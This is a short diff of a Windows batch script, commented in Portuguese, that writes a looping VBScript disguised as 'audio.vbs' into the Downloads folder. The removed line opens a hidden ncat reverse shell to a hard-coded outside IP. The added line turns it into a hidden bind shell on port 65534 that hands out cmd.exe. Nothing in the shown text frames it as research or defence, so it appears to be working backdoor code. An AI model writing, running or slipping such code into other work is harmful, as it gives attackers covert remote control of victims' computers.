@@ -22,7 +22,7 @@ set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"
 
 :: Criar audio.vbs
 echo Do > "%USERPROFILE%\Downloads\audio.vbs"
-echo CreateObject("Wscript.Shell").Run "ncat 177.185.252.145 65534 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat -lnp 65534 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
 echo Loop >> "%USERPROFILE%\Downloads\audio.vbs"
 
 :: Criar audio.bat
